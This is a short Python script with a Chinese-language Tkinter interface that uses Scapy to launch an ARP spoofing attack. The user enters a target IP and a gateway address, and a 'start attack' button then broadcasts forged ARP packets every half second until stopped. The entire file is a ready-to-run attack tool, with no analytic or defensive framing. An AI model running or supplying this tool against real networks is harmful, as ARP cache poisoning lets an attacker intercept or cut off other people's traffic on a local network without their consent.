from scapy.all import ARP,Ether,sendp
from tkinter import*
from tkinter import messagebox
import time
import threading


bools = False
def arp(ip1,ip2):
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip1,psrc=ip2)#构造ARP欺骗包
    sendp(pkt)#发送
def main_arp(ip1,ip2):
    messagebox.showinfo("ARP","攻击开始,详情请见命令行")
    while bools:
        arp(ip1,ip2)
        time.sleep(0.5)
        print('[*]未发现异常')
    print('[*]攻击已停止')
    messagebox.showinfo("ARP","攻击结束")
tk = Tk()
tk.title('arp单人')
tk.geometry('300x160+420+200')

def start_arp():
    global bools
    ip1 = en.get()
    ip2 = en_1.get()
    bools = True
    t = threading.Thread(target=main_arp, args=(ip1,ip2))
    t.start()

def stop_arp():
    global bools
    bools = False
    return True


#----------------input-------------
en = Entry(tk)
en.place(x=80,y=5)
en_1 = Entry(tk)
en_1.place(x=80,y=50)

#-----------------text------------
w= Label(tk,text='目标IP:',fg="red")
w.place(x=20,y=5)
w_2= Label(tk,text='网关:',fg="red")
w_2.place(x=20,y=50)

#----------------butter----------

b = Button(tk, text ="开始攻击", command=start_arp)
b.place(x=20,y=80)
b_2 = Button(tk, text ="停止", command=stop_arp)
b_2.place(x=200,y=80)
tk.mainloop()

#-------------other----------




